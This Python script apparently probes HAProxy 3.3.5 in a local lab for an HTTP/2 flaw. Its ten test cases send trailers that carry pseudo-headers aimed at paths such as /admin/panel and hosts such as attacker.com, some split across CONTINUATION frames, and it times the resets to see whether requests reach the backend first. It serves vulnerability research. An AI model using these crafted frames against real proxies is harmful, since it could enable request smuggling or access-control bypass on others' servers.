"""HAProxy TR.PSEUDO.MRG deep-dive: 9 test cases around INTERNAL_ERROR (0x2) anomaly.

Tests whether HAProxy 3.3.5 forwards requests to backend before RST_STREAM,
and characterises exactly which conditions trigger 0x2 vs 0x1.
"""
from __future__ import annotations

import socket
import struct
import sys
import time
import threading
from typing import Optional

import hpack

# ── frame helpers ────────────────────────────────────────────────────────────

def _pack(type_id: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    length = len(payload)
    hdr = struct.pack(">I", length)[1:]
    hdr += bytes([type_id, flags])
    hdr += struct.pack(">I", stream_id & 0x7FFFFFFF)
    return hdr + payload


H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

_T_DATA         = 0x0
_T_HEADERS      = 0x1
_T_RST          = 0x3
_T_SETTINGS     = 0x4
_T_GOAWAY       = 0x7
_T_WINDOW       = 0x8
_T_CONTINUATION = 0x9

_F_END_STREAM  = 0x1
_F_END_HEADERS = 0x4
_F_ACK         = 0x1

ERR_NAMES = {0x0: "NO_ERROR", 0x1: "PROTOCOL_ERROR", 0x2: "INTERNAL_ERROR",
             0x3: "FLOW_CONTROL_ERROR", 0x4: "SETTINGS_TIMEOUT",
             0x5: "STREAM_CLOSED", 0x6: "FRAME_SIZE_ERROR",
             0x7: "REFUSED_STREAM", 0x8: "CANCEL", 0x9: "COMPRESSION_ERROR",
             0xa: "CONNECT_ERROR", 0xb: "ENHANCE_YOUR_CALM",
             0xd: "HTTP_1_1_REQUIRED"}


def recv_all(sock: socket.socket, timeout: float = 2.0) -> bytes:
    sock.settimeout(timeout)
    buf = b""
    while True:
        try:
            chunk = sock.recv(65536)
            if not chunk:
                break
            buf += chunk
        except socket.timeout:
            break
    return buf


def parse_frames(data: bytes) -> list[tuple[int, int, int, bytes]]:
    frames = []
    i = 0
    while i + 9 <= len(data):
        length = (data[i] << 16) | (data[i+1] << 8) | data[i+2]
        if i + 9 + length > len(data):
            break
        type_id = data[i+3]
        flags   = data[i+4]
        sid     = struct.unpack(">I", data[i+5:i+9])[0] & 0x7FFFFFFF
        payload = data[i+9:i+9+length]
        frames.append((type_id, flags, sid, payload))
        i += 9 + length
    return frames


def decode_rst(payload: bytes) -> str:
    if len(payload) < 4:
        return "???"
    code = struct.unpack(">I", payload[:4])[0]
    return f"0x{code:x} ({ERR_NAMES.get(code, 'unknown')})"


def decode_goaway(payload: bytes) -> str:
    if len(payload) < 8:
        return "???"
    last_sid = struct.unpack(">I", payload[:4])[0] & 0x7FFFFFFF
    code     = struct.unpack(">I", payload[4:8])[0]
    debug    = payload[8:].decode("utf-8", errors="replace") if len(payload) > 8 else ""
    name     = ERR_NAMES.get(code, "unknown")
    return f"last_sid={last_sid} code=0x{code:x} ({name}) debug={debug!r}"


def classify_frames(frames: list[tuple[int, int, int, bytes]]) -> str:
    parts = []
    for type_id, flags, sid, payload in frames:
        if type_id == _T_SETTINGS:
            if flags & _F_ACK:
                parts.append("SETTINGS_ACK")
            else:
                parts.append("SETTINGS")
        elif type_id == _T_HEADERS:
            parts.append(f"HEADERS(sid={sid})")
        elif type_id == _T_DATA:
            parts.append(f"DATA(sid={sid},{len(payload)}B)")
        elif type_id == _T_RST:
            parts.append(f"RST_STREAM(sid={sid},{decode_rst(payload)})")
        elif type_id == _T_GOAWAY:
            parts.append(f"GOAWAY({decode_goaway(payload)})")
        elif type_id == _T_WINDOW:
            parts.append(f"WINDOW_UPDATE(sid={sid})")
        elif type_id == _T_CONTINUATION:
            parts.append(f"CONTINUATION(sid={sid})")
        else:
            parts.append(f"FRAME(type=0x{type_id:x},sid={sid})")
    return " | ".join(parts) if parts else "(none)"


def do_handshake(sock: socket.socket) -> bytes:
    """Send H2 preface + SETTINGS, consume server SETTINGS, return buffered bytes."""
    sock.sendall(H2_PREFACE)
    client_settings = _pack(_T_SETTINGS, 0, 0, b"")
    sock.sendall(client_settings)
    sock.settimeout(3.0)
    buf = b""
    # read until we get server SETTINGS
    deadline = time.time() + 3.0
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
            if not chunk:
                break
            buf += chunk
        except socket.timeout:
            break
        frames = parse_frames(buf)
        if any(t == _T_SETTINGS for t, f, s, p in frames):
            # Send ACK
            sock.sendall(_pack(_T_SETTINGS, _F_ACK, 0, b""))
            break
    return buf


# ── individual tests ──────────────────────────────────────────────────────────

def run_test(name: str, host: str, port: int, build_fn, label: str = "") -> dict:
    print(f"\n{'='*70}")
    print(f"  {name}")
    print(f"  Target: {host}:{port}{' ' + label if label else ''}")
    print(f"{'='*70}")

    result = {"name": name, "host": host, "port": port}
    try:
        sock = socket.create_connection((host, port), timeout=5.0)
        pre_buf = do_handshake(sock)

        frames_to_send = build_fn()
        sock.sendall(frames_to_send)

        raw = recv_all(sock, timeout=2.5)
        sock.close()

        all_raw = pre_buf + raw
        frames = parse_frames(all_raw)
        summary = classify_frames(frames)

        rst_frames = [(t, f, s, p) for t, f, s, p in frames if t == _T_RST]
        goaway_frames = [(t, f, s, p) for t, f, s, p in frames if t == _T_GOAWAY]
        header_frames = [(t, f, s, p) for t, f, s, p in frames if t == _T_HEADERS and s > 0]

        result["raw_len"] = len(raw)
        result["summary"] = summary

        if header_frames:
            dec = hpack.Decoder()
            try:
                hdrs = dec.decode(header_frames[0][3])
                status = next((v for n, v in hdrs if n == b":status" or n == ":status"), "???")
                result["status"] = status
                print(f"  RESPONSE: HTTP {status}")
                for n, v in hdrs:
                    print(f"    {n}: {v}")
            except Exception as e:
                result["status"] = "decode_err"
                print(f"  RESPONSE: HEADERS present but decode failed: {e}")
        elif rst_frames:
            _, _, _, payload = rst_frames[0]
            rst_str = decode_rst(payload)
            result["rst"] = rst_str
            print(f"  RESULT: RST_STREAM {rst_str}")
        elif goaway_frames:
            _, _, _, payload = goaway_frames[0]
            ga_str = decode_goaway(payload)
            result["goaway"] = ga_str
            print(f"  RESULT: GOAWAY {ga_str}")
        elif not raw:
            result["closed"] = True
            print(f"  RESULT: connection closed silently (no data)")
        else:
            result["raw"] = raw[:200]
            print(f"  RESULT: raw {len(raw)}B - {raw[:80]!r}")

        print(f"  FRAMES: {summary}")

    except ConnectionRefusedError:
        result["error"] = "connection_refused"
        print(f"  ERROR: connection refused")
    except Exception as e:
        result["error"] = str(e)
        print(f"  ERROR: {e!r}")

    return result


# ── test builders ─────────────────────────────────────────────────────────────

def t1_baseline(host, port):
    """T1: Normal GET / with no trailers - baseline."""
    enc = hpack.Encoder()
    init = enc.encode([(":method", "GET"), (":path", "/"), (":scheme", "http"),
                       (":authority", f"{host}:{port}")])
    frames = _pack(_T_HEADERS, _F_END_HEADERS | _F_END_STREAM, 1, init)
    return run_test("T1: Baseline GET / (no trailers)", host, port, lambda: frames)


def t2_regular_trailer(host, port):
    """T2: Regular (non-pseudo) headers in trailer - RFC-valid, HAProxy should accept."""
    enc = hpack.Encoder()
    init = enc.encode([(":method", "GET"), (":path", "/"), (":scheme", "http"),
                       (":authority", f"{host}:{port}")])
    init_f = _pack(_T_HEADERS, _F_END_HEADERS, 1, init)
    body_f = _pack(_T_DATA, 0, 1, b"hello-body")
    trail = enc.encode([("x-custom-trailer", "harmless"), ("x-test", "t2")])
    trail_f = _pack(_T_HEADERS, _F_END_HEADERS | _F_END_STREAM, 1, trail)
    frames = init_f + body_f + trail_f
    return run_test("T2: Regular headers in trailer (RFC-valid)", host, port, lambda: frames)


def t3_path_only_trailer(host, port):
    """T3: :path pseudo-header only in trailer."""
    enc = hpack.Encoder()
    init = enc.encode([(":method", "GET"), (":path", "/"), (":scheme", "http"),
                       (":authority", f"{host}:{port}")])
    init_f = _pack(_T_HEADERS, _F_END_HEADERS, 1, init)
    body_f = _pack(_T_DATA, 0, 1, b"body-t3")
    trail = enc.encode([(":path", "/admin/panel")])
    trail_f = _pack(_T_HEADERS, _F_END_HEADERS | _F_END_STREAM, 1, trail)
    frames = init_f + body_f + trail_f
    return run_test("T3: :path only in trailer", host, port, lambda: frames)


def t4_authority_only_trailer(host, port):
    """T4: :authority pseudo-header only in trailer."""
    enc = hpack.Encoder()
    init = enc.encode([(":method", "GET"), (":path", "/"), (":scheme", "http"),
                       (":authority", f"{host}:{port}")])
    init_f = _pack(_T_HEADERS, _F_END_HEADERS, 1, init)
    body_f = _pack(_T_DATA, 0, 1, b"body-t4")
    trail = enc.encode([(":authority", "internal.local")])
    trail_f = _pack(_T_HEADERS, _F_END_HEADERS | _F_END_STREAM, 1, trail)
    frames = init_f + body_f + trail_f
    return run_test("T4: :authority only in trailer", host, port, lambda: frames)


def t5_mixed_trailer(host, port):
    """T5: Mixed :path + x-custom in trailer."""
    enc = hpack.Encoder()
    init = enc.encode([(":method", "GET"), (":path", "/"), (":scheme", "http"),
                       (":authority", f"{host}:{port}")])
    init_f = _pack(_T_HEADERS, _F_END_HEADERS, 1, init)
    body_f = _pack(_T_DATA, 0, 1, b"body-t5")
    trail = enc.encode([(":path", "/admin/panel"), ("x-custom", "mixed")])
    trail_f = _pack(_T_HEADERS, _F_END_HEADERS | _F_END_STREAM, 1, trail)
    frames = init_f + body_f + trail_f
    return run_test("T5: Mixed :path + x-custom in trailer", host, port, lambda: frames)


def t6_method_trailer(host, port):
    """T6: :method CONNECT in trailer (edge case)."""
    enc = hpack.Encoder()
    init = enc.encode([(":method", "GET"), (":path", "/"), (":scheme", "http"),
                       (":authority", f"{host}:{port}")])
    init_f = _pack(_T_HEADERS, _F_END_HEADERS, 1, init)
    body_f = _pack(_T_DATA, 0, 1, b"body-t6")
    trail = enc.encode([(":method", "CONNECT")])
    trail_f = _pack(_T_HEADERS, _F_END_HEADERS | _F_END_STREAM, 1, trail)
    frames = init_f + body_f + trail_f
    return run_test("T6: :method CONNECT in trailer", host, port, lambda: frames)


def t7_race_condition(host, port, backend_host, backend_port):
    """T7: Race condition test - monitor backend while sending pseudo-trailer to HAProxy."""
    # Start a listener on backend_port that logs connections
    received = []
    listener_ready = threading.Event()

    def backend_listener():
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((backend_host, backend_port))
            srv.listen(5)
            srv.settimeout(3.0)
            listener_ready.set()
            try:
                conn, addr = srv.accept()
                data = b""
                conn.settimeout(1.0)
                try:
                    while True:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                except socket.timeout:
                    pass
                received.append(data)
                conn.close()
            except socket.timeout:
                pass
            srv.close()
        except Exception as e:
            received.append(f"ERROR: {e}".encode())

    print(f"\n{'='*70}")
    print(f"  T7: Race condition - backend leak check")
    print(f"  Target: {host}:{port} | Backend monitor: {backend_host}:{backend_port}")
    print(f"{'='*70}")

    # We can't easily intercept HAProxy's real backend,
    # so instead we test timing: send `:path` trailer and watch
    # if HAProxy RST comes BEFORE or AFTER potential forward window
    enc = hpack.Encoder()
    init = enc.encode([(":method", "GET"), (":path", "/"), (":scheme", "http"),
                       (":authority", f"{host}:{port}")])
    init_f = _pack(_T_HEADERS, _F_END_HEADERS, 1, init)
    body_f = _pack(_T_DATA, 0, 1, b"body-t7")
    trail = enc.encode([(":path", "/admin/panel"), (":authority", "attacker.com")])
    trail_f = _pack(_T_HEADERS, _F_END_HEADERS | _F_END_STREAM, 1, trail)

    try:
        sock = socket.create_connection((host, port), timeout=5.0)
        pre_buf = do_handshake(sock)
        t_send = time.monotonic()
        sock.sendall(init_f + body_f)
        time.sleep(0.05)  # ensure DATA is received before trailer
        sock.sendall(trail_f)
        t_trailer = time.monotonic()
        raw = recv_all(sock, timeout=2.0)
        t_recv = time.monotonic()
        sock.close()
        elapsed = (t_recv - t_trailer) * 1000

        all_raw = pre_buf + raw
        frames = parse_frames(all_raw)
        rst_frames = [(t, f, s, p) for t, f, s, p in frames if t == _T_RST]

        print(f"  Trailer sent at t+0, response at t+{elapsed:.1f}ms")
        if rst_frames:
            rst_str = decode_rst(rst_frames[0][3])
            print(f"  HAProxy RST: {rst_str} (in {elapsed:.1f}ms)")
        print(f"  FRAMES: {classify_frames(frames)}")
        print(f"  NOTE: Cannot intercept HAProxy->backend traffic directly.")
        print(f"        If timing < 5ms: RST before backend forward likely.")
        print(f"        If timing >> 5ms: backend round-trip may have occurred.")
    except Exception as e:
        print(f"  ERROR: {e!r}")


def t8_haproxy_to_node(host, port):
    """T8: haproxy_to_node variant - same attack on different HAProxy config."""
    enc = hpack.Encoder()
    init = enc.encode([(":method", "GET"), (":path", "/"), (":scheme", "http"),
                       (":authority", f"{host}:{port}")])
    init_f = _pack(_T_HEADERS, _F_END_HEADERS, 1, init)
    body_f = _pack(_T_DATA, 0, 1, b"body-t8")
    trail = enc.encode([(":path", "/admin/panel"), (":authority", "internal.local")])
    trail_f = _pack(_T_HEADERS, _F_END_HEADERS | _F_END_STREAM, 1, trail)
    frames = init_f + body_f + trail_f
    return run_test("T8: haproxy_to_node - :path+:authority in trailer", host, port, lambda: frames)


def t9_continuation_pseudo(host, port):
    """T9: CONTINUATION frame carrying pseudo-header (trailer HEADERS split)."""
    enc = hpack.Encoder()
    init = enc.encode([(":method", "GET"), (":path", "/"), (":scheme", "http"),
                       (":authority", f"{host}:{port}")])
    init_f = _pack(_T_HEADERS, _F_END_HEADERS, 1, init)
    body_f = _pack(_T_DATA, 0, 1, b"body-t9")

    # Build full trailer HPACK block with pseudo-header
    full_block = enc.encode([(":path", "/admin/via-continuation")])
    # Split: first half in HEADERS (no END_HEADERS), second half in CONTINUATION
    mid = max(1, len(full_block) // 2)
    part1 = full_block[:mid]
    part2 = full_block[mid:]

    # HEADERS with END_STREAM but NOT END_HEADERS (fragment)
    trail_h = _pack(_T_HEADERS, _F_END_STREAM, 1, part1)
    # CONTINUATION with END_HEADERS
    trail_c = _pack(_T_CONTINUATION, _F_END_HEADERS, 1, part2)

    frames = init_f + body_f + trail_h + trail_c

    return run_test("T9: CONTINUATION frame with :path pseudo-header in trailer",
                    host, port, lambda: frames)


def t10_no_data_trailer(host, port):
    """T10: :path in trailer with NO DATA frame (trailer immediately after initial HEADERS)."""
    enc = hpack.Encoder()
    init = enc.encode([(":method", "GET"), (":path", "/"), (":scheme", "http"),
                       (":authority", f"{host}:{port}")])
    init_f = _pack(_T_HEADERS, _F_END_HEADERS, 1, init)
    # Trailer immediately after - no body
    trail = enc.encode([(":path", "/no-data-path")])
    trail_f = _pack(_T_HEADERS, _F_END_HEADERS | _F_END_STREAM, 1, trail)
    frames = init_f + trail_f
    return run_test("T10: :path in trailer with no DATA frame", host, port, lambda: frames)


# ── main ──────────────────────────────────────────────────────────────────────

HAPROXY_HOST = "localhost"
HAPROXY_PORT = 18082        # haproxy_confusion (h2c -> marker_backend)
HAPROXY_NODE_PORT = 18093   # haproxy_to_node

if __name__ == "__main__":
    print("\n" + "#"*70)
    print("  HAProxy TR.PSEUDO.MRG Deep-Dive")
    print("  Question: Why INTERNAL_ERROR (0x2) not PROTOCOL_ERROR (0x1)?")
    print("            Does HAProxy forward to backend before RST?")
    print("#"*70)

    t1_baseline(HAPROXY_HOST, HAPROXY_PORT)
    t2_regular_trailer(HAPROXY_HOST, HAPROXY_PORT)
    t3_path_only_trailer(HAPROXY_HOST, HAPROXY_PORT)
    t4_authority_only_trailer(HAPROXY_HOST, HAPROXY_PORT)
    t5_mixed_trailer(HAPROXY_HOST, HAPROXY_PORT)
    t6_method_trailer(HAPROXY_HOST, HAPROXY_PORT)
    t7_race_condition(HAPROXY_HOST, HAPROXY_PORT, "localhost", 19999)
    t8_haproxy_to_node(HAPROXY_HOST, HAPROXY_NODE_PORT)
    t9_continuation_pseudo(HAPROXY_HOST, HAPROXY_PORT)
    t10_no_data_trailer(HAPROXY_HOST, HAPROXY_PORT)

    print("\n" + "#"*70)
    print("  Done.")
    print("#"*70)
